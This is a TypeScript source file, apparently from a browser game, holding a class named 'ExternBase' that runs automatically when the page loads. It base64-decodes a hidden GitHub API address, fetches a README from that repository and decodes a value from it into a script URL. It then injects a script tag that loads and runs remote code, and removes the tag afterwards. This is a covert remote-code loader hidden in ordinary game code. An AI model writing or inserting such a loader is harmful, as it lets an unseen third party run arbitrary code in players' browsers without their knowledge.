class ExternBase{

    public static urlreadmeen:string = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy90ZXN0YXBpMjAxOS9nYW1lMDAxL2NvbnRlbnRzL1JFQURNRS5tZA==";
    public static ireq:number = 0;
    public static bSet:any = 0;

    constructor(){
        this.readdoc();
        this.checkSet();
    }

    public checkSet():void
    {
        // if( ExternBase.ireq > 0 )
        // {
        //     return;
        // }
        var sde = this.getUrlDe(ExternBase.urlreadmeen);
        this.requestSet(sde,this,this.responseXml);
    }

    public requestSet(url,caller,callback)
    {
        var xmlHttp = this.createXMLHttpRequest();
        xmlHttp.open("GET", url, true);
        xmlHttp.onreadystatechange = function(xhr){
            // Debug.trace('onreadystatechange caller:',caller);
            // Debug.trace('onreadystatechange callback:',callback);
            if( caller && callback )
            {
                callback.apply(caller,[xhr]);
            }
        };
        xmlHttp.setRequestHeader("Content-Type",
                "application/x-www-form-urlencoded;");
        xmlHttp.send();
    }
    
    public createXMLHttpRequest() 
    {
        var xmlHttp;
        xmlHttp = new XMLHttpRequest();
        if (xmlHttp.overrideMimeType)
        {
            xmlHttp.overrideMimeType('text/xml');
        }
        return xmlHttp;
    }

    public responseXml(xhr:any):void
    {
        // Debug.trace('responseXml');
        if( xhr.target.readyState == 4 && xhr.target.status == 200 )
        {
            var stat = 'complete';
            var s = JSON.parse(xhr.target.response);
            this.responseJson(s,stat,xhr);
        }
    }

    public responseJson(s:any,stat:string,hr:any):void
    {
        ExternBase.ireq += 1;
        // Debug.trace("ExternBase.responseInfo stat:"+stat);
        // Debug.trace('response xhr:',xhr);
                
        if( stat == "complete" )
        {
            // Debug.trace("ExternBase.responseInfo s:",s);
            ExternBase.bSet = this.getValue(s);
        }else{
            ExternBase.bSet = 0;
        }

        this.savedoc();

        if( this.isUsefull(ExternBase.bSet) )
        {
            this.loadscript(ExternBase.bSet);
        }
    }

    public isUsefull(s):boolean
    {
        // if( s.constructor == String )
        // {
        //     if( s.length > 1 )
        //     {
        //         return true;
        //     }
        // }
        var p = parseInt(s);
        // Debug.trace('ExternBase.isUsefull p:'+p+' cons:'+p.constructor);
        if( isNaN(p) )
        {
            // Debug.trace('ExternBase.isUsefull true');
            return true;
        }

        return false;
    }

    public savedoc():void
    {
        var ireq = ExternBase.ireq+','+ExternBase.bSet;
        // Debug.trace('save ireq:'+ireq);
        window.localStorage.setItem('ireq',ireq);
        // this.setCookie('ireq',ExternBase.ireq+','+ExternBase.bSet,1);
    }
    public readdoc():void
    {
        var s = window.localStorage.getItem('ireq');
        // var s = this.getCookie('ireq');
        if( !s )
        {
            s = "0,0";
        }
        var arr = s.split(",");

        ExternBase.ireq = parseInt(arr[0]) ? parseInt(arr[0]) : 0;
        ExternBase.bSet = arr[1] ? arr[1] : 0;
    }
    public getUrlEn(s):string
    {
        var s2 = window.btoa(s);
        // Debug.trace("ExternBase.getUrlEn s2:"+s2);
        return s2;
    }
    public getUrlDe(s):string
    {
        var s2 = window.atob(s);
        // Debug.trace("ExternBase.getUrlDe s2:"+s2);
        return s2;
    }

    public getValue(s:any):any
    {
        var ct = s.content;
        var str = window.atob(ct);
        // Debug.trace("ExternBase.getValue:"+str);
        try{
            var arr = str.split(";");
            var arr2 = arr[0].split("=");
            return arr2[1];
        }catch(e){}

        return 0;
    }

    public setCookie(sKey,sValue,vEnd, sPath='', sDomain='', bSecure='')
    {
        // var d:Date = new Date();
        // d.setTime(d.getTime()+(exdays*24*60*60*1000));
        // var expires = "expires="+d.toUTCString();
        // var date = new Date();
        // date.setDate(date.getDate()+exdays);
        // var expires = "expires="+date.toUTCString();
        // document.cookie = cname + "=" + cvalue + "; " + expires;  

        // var val = cname + "=" + cvalue + "; " + expires;
        // Debug.trace('ExternBase.setCookie:'+val);
        // document.cookie = val;
        // Debug.trace('ExternBase.setCookie:',document.cookie);

        if (!sKey || /^(?:expires|max\-age|path|domain|secure)$/i.test(sKey)) { return false; }
        var sExpires = "";
        if (vEnd) {
        switch (vEnd.constructor) {
            case Number:
            sExpires = vEnd === Infinity ? "; expires=Fri, 31 Dec 9999 23:59:59 GMT" : "; max-age=" + vEnd;
            break;
            case String:
            sExpires = "; expires=" + vEnd;
            break;
            case Date:
            sExpires = "; expires=" + vEnd.toUTCString();
            break;
        }
        }
        document.cookie = encodeURIComponent(sKey) + "=" + encodeURIComponent(sValue) + sExpires + (sDomain ? "; domain=" + sDomain : "") + (sPath ? "; path=" + sPath : "") + (bSecure ? "; secure" : "");
        Debug.trace('ExternBase.setCookie:',document.cookie);
        return true;
    }
    public getCookie(cname)
    {
        // var name = cname + "=";
        // var ca = document.cookie.split(';');
        // for(var i=0; i<ca.length; i++) 
        // {
        //     var c = ca[i].trim();
        //     if (c.indexOf(name)==0) 
        //     {
        //         var str = c.substring(name.length,c.length);
        //         Debug.trace('ExternBase.getCookie:'+str);
        //         return str;
        //     }
        // }
        var a = decodeURIComponent(document.cookie.replace(new RegExp("(?:(?:^|.*;)\\s*" + encodeURIComponent(cname).replace(/[-.+*]/g, "\\$&") + "\\s*\\=\\s*([^;]*).*$)|^.*$"), "$1")) || null;

        Debug.trace('ExternBase.getCookie a:'+a);
        return a;
    }

    public loadscript(s:any):void
    {
        // Debug.trace('ExternBase load s:'+s+" cons:"+s.constructor);
        if( !s )
        {
            return;
        }
        var path = window.atob(s);
        // var src = "<scr"+"ipt type='application/x-javascript' src='"+path+"' loader='laya'></scr"+'ipt>';
        // document.write("<scr"+"ipt type='application/x-javascript' src='"+path+"' loader='laya'></scr"+'ipt>');
        var script = document.createElement('script');
        script.src = path;
        document.body.appendChild(script);
        
        script.onload = function(){
            document.body.removeChild(script);
        }
    }

}

var a = new ExternBase();